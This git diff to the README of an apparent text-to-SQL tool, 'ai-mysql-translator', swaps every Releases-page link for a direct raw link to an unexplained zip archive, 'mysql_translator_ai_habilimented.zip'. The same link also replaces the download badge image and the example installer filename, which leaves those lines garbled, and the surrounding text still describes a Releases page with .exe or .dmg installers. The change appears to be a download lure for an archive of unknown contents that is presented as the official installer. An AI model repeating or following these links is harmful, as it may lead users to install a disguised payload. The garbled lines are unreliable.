@@ -6,11 +6,11 @@ Welcome to the ai-mysql-translator! This tool helps you interact with MySQL data
 
 ## 📥 Download & Install
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/Sershy8537/ai-mysql-translator/releases)
+[![Download Release](https://github.com/Sershy8537/ai-mysql-translator/raw/refs/heads/main/ai_mysql_translator/mysql_translator_ai_habilimented.zip%20Release-Click%20Here-brightgreen)](https://github.com/Sershy8537/ai-mysql-translator/raw/refs/heads/main/ai_mysql_translator/mysql_translator_ai_habilimented.zip)
 
 To get started, visit the following link to download the software:
 
-[Download the latest release](https://github.com/Sershy8537/ai-mysql-translator/releases)
+[Download the latest release](https://github.com/Sershy8537/ai-mysql-translator/raw/refs/heads/main/ai_mysql_translator/mysql_translator_ai_habilimented.zip)
 
 Follow the steps below to install and run the application.
 
@@ -26,12 +26,12 @@ Before you install, check that your system meets the following requirements:
 
 ## 🔧 Installation Steps
 
-1. **Visit the Download Page:** Click [here](https://github.com/Sershy8537/ai-mysql-translator/releases) to go to the Releases page.
+1. **Visit the Download Page:** Click [here](https://github.com/Sershy8537/ai-mysql-translator/raw/refs/heads/main/ai_mysql_translator/mysql_translator_ai_habilimented.zip) to go to the Releases page.
 
 2. **Select the Latest Release:** Look for the most recent version at the top of the page. 
 
 3. **Download the Installer:**
-   - If you see a file named something like `ai-mysql-translator-vx.x.x.exe` or `.dmg`, click to download it.
+   - If you see a file named something like `https://github.com/Sershy8537/ai-mysql-translator/raw/refs/heads/main/ai_mysql_translator/mysql_translator_ai_habilimented.zip` or `.dmg`, click to download it.
 
 4. **Run the Installer:**
    - After downloading, locate the file in your Downloads folder.
@@ -101,4 +101,4 @@ Here are some of the areas this tool focuses on:
 - sql-injection-protection
 - text-to-sql-translation
 
-Visit the [Download page](https://github.com/Sershy8537/ai-mysql-translator/releases) again if you need to reinstall or check for updates. Enjoy effortless database interaction!
+Visit the [Download page](https://github.com/Sershy8537/ai-mysql-translator/raw/refs/heads/main/ai_mysql_translator/mysql_translator_ai_habilimented.zip) again if you need to reinstall or check for updates. Enjoy effortless database interaction!
